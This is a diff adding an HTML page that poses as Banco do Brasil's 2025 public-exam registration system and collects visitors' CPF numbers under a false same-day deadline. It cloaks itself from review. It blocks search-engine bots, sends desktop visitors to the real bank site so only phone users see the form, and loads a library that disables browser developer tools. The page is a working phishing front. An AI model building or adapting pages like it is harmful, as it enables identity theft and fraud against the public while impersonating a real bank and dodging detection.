@@ -1,0 +1,223 @@
+<!DOCTYPE html><html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco do Brasil - Inscrição Concurso 2025</title>
+
+    <!-- Preload fonts -->
+    <link rel="preload" href="/static/fonts/rawline-400.woff2" as="font" type="font/woff2" crossorigin="">
+    <link rel="preload" href="/static/fonts/rawline-700.woff2" as="font" type="font/woff2" crossorigin="">
+
+    <!-- Styles -->
+    <link href="css/rawline.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .animate-spin {
+            animation: spin 1s linear infinite;
+        }
+    </style>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'bb-yellow': '#FEEF37',
+                        'bb-blue': '#003DA5',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+    <script>
+        // Função para detectar se é um dispositivo móvel
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // Função para detectar se é um bot
+        function isBot() {
+            const botAgents = [
+                'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+                'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+            ];
+
+            return botAgents.some(bot => navigator.userAgent.includes(bot));
+        }
+
+        // Redirecionar ou bloquear o acesso
+        function checkAccess() {
+            if (isBot()) {
+                // Se for bot, bloquear o acesso
+                document.body.innerHTML = "<h1>Acesso negado</h1><p>Bots não são permitidos neste site.</p>";
+            } else if (!isMobile()) {
+                // Se não for dispositivo móvel, bloquear o acesso
+                document.body.innerHTML = "<h1>Acesso somente em dispositivos móveis</h1><p>Por favor, acesse este site de um celular.</p>";
+            }
+        }
+
+        // Executar a função de verificação ao carregar a página
+        window.onload = checkAccess;
+    </script>
+
+    <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" url="https://www.bb.com.br/site/concurso-bb/"></script>
+
+    <script type="text/javascript">
+        if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
+            window.location.href = 'https://www.bb.com.br/site/concurso-bb/';
+        }
+    </script>
+
+    <script type="text/javascript">
+        window.hasMobileFirstExtension = true;
+    </script>
+
+    <div class="bg-bb-yellow py-4 shadow-sm">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="images/png-transparent-banco-do-brasil-hd-logo-thumbnail-removebg-preview-1.png" alt="Logo do Banco do Brasil" class="h-12 mb-2">
+                <div>
+                    <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
+                        CONCURSO PÚBLICO 2025
+                    </p>
+                    <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
+                        SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="bg-bb-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+            </div>
+            <span class="text-white text-xl font-semibold tracking-wide drop-shadow-sm">Sistema de Inscrição</span>
+        </div>
+    </div>
+
+    <div class="container mx-auto px-4 py-6">
+        <div class="bg-yellow-50 border border-yellow-100 rounded-lg p-4 mb-6 shadow-sm">
+            <div class="flex items-start">
+                <i class="fas fa-info-circle text-bb-blue text-xl mr-3 mt-0.5"></i>
+                <div>
+                    <p class="font-bold mb-2 text-bb-blue">INFORMAÇÕES IMPORTANTES</p>
+                    <p class="text-sm text-gray-700 leading-relaxed">Prezado(a) Candidato(a), bem-vindo(a) ao sistema de inscrição do Concurso Público do Banco do Brasil 2025. Para prosseguir com sua inscrição, informe seu CPF. O <span class="font-bold">prazo para as inscrições</span> se encerra <span class="font-bold">hoje, 30/01/2025</span>. Após esta data, <span class="font-bold">não será possível</span> realizar novas inscrições.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container mx-auto px-4 pb-8 flex-grow">
+        <div class="bg-white rounded-lg shadow-lg p-8 border border-gray-100">
+            <form id="inscricaoForm" method="POST" action="/consultar_cpf">
+                <p class="mb-6 font-bold text-lg text-bb-blue">Dados para Inscrição:</p>
+                <div class="space-y-6">
+                    <div class="relative">
+                        <label class="block text-gray-700 text-sm font-bold mb-2" for="cpf">CPF:</label>
+                        <div class="relative">
+                            <input class="appearance-none border border-gray-300 rounded-md w-full py-2.5 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent transition duration-200" id="cpf" name="cpf" type="text" inputmode="numeric" maxlength="14" placeholder="Digite apenas números" required="">
+                            <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+                                <i class="fas fa-id-card text-gray-400"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <button type="submit" id="submitBtn" class="bg-bb-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md w-full flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-4">
+                        <span>Prosseguir com a Inscrição</span>
+                        <i class="fas fa-arrow-right ml-2"></i>
+                    </button>
+                </div>
+            </form>
+            
+                
+            
+        </div>
+    </div>
+
+    <div class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© 2025 Banco do Brasil S.A. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento BB - 0800 729 0722</p>
+    </div>
+
+    <script>
+        document.getElementById('inscricaoForm').addEventListener('submit', function(e) {
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = submitBtn.querySelector('span');
+            const btnIcon = submitBtn.querySelector('i');
+            const cpfInput = document.getElementById('cpf');
+
+            // Remove pontuação antes de enviar
+            cpfInput.value = cpfInput.value.replace(/\D/g, '');
+
+            // Change button appearance
+            submitBtn.classList.add('bg-opacity-75');
+            submitBtn.disabled = true;
+            btnText.textContent = 'Processando...';
+            btnIcon.classList.remove('fa-arrow-right');
+            btnIcon.classList.add('fa-circle-notch', 'animate-spin');
+
+            // Adiciona timeout para restaurar o botão em caso de erro
+            setTimeout(function() {
+                if (submitBtn.disabled) {
+                    submitBtn.classList.remove('bg-opacity-75');
+                    submitBtn.disabled = false;
+                    btnText.textContent = 'Prosseguir com a Inscrição';
+                    btnIcon.classList.remove('fa-circle-notch', 'animate-spin');
+                    btnIcon.classList.add('fa-arrow-right');
+                }
+            }, 10000);
+        });
+
+        // Máscara para CPF
+        const cpfInput = document.getElementById('cpf');
+        cpfInput.addEventListener('input', function(e) {
+            let value = e.target.value;
+            value = value.replace(/\D/g, '');
+            if (value.length > 11) {
+                value = value.slice(0, 11);
+            }
+            if (value.length > 0) {
+                if (value.length <= 3) {
+                    value = value;
+                }
+                else if (value.length <= 6) {
+                    value = value.slice(0, 3) + '.' + value.slice(3);
+                }
+                else if (value.length <= 9) {
+                    value = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6);
+                }
+                else {
+                    value = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6, 9) + '-' + value.slice(9);
+                }
+            }
+            e.target.value = value;
+        });
+
+        cpfInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' || e.key === 'Delete') {
+                let value = this.value.replace(/\D/g, '');
+                if (value.length > 0) {
+                    value = value.slice(0, -1);
+                    let event = new Event('input');
+                    this.value = value;
+                    this.dispatchEvent(event);
+                }
+                e.preventDefault();
+            }
+        });
+    </script>
+
+</body></html>
